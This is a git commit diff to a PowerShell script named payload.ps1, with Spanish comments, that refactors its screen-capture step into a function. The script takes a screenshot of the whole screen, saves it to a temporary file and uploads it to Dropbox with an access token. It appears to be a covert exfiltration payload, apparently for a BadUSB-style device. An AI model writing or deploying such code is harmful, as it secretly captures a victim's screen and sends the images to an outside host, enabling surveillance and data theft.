2b42756a7dbda82519601cde294b0c08c6f1ad2e
flippemen <99625153+dolaraso@users.noreply.github.com>
2024-09-10 03:27:06 -0500

    Update payload.ps1

--- captura de pantalla/payload.ps1
+++ captura de pantalla/payload.ps1
@@ -17,7 +17,6 @@ if (-not $db) {
     exit
 }
 
-# Función para subir un archivo a Dropbox
 function DropBox-Upload {
     param (
         [string]$SourceFilePath
@@ -33,18 +32,25 @@ function DropBox-Upload {
     Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-# Cargar System.Windows.Forms y tomar una captura de pantalla
-Add-Type -AssemblyName System.Windows.Forms
-$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
+function Capture-Screenshot {
+    # Cargar System.Windows.Forms y tomar una captura de pantalla
+    Add-Type -AssemblyName System.Windows.Forms
+    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
 
-# Guardar la captura de pantalla en un archivo temporal
-$filePath = "$env:temp\sc.png"
-$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
-$graphics.Dispose()
-$bitmap.Dispose()
+    # Guardar la captura de pantalla en un archivo temporal
+    $filePath = "$env:temp\sc.png"
+    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
+    $graphics.Dispose()
+    $bitmap.Dispose()
+
+    return $filePath
+}
+
+# Capturar la pantalla y obtener la ruta del archivo
+$filePath = Capture-Screenshot
 
 # Subir la captura de pantalla a Dropbox
 DropBox-Upload -SourceFilePath $filePath
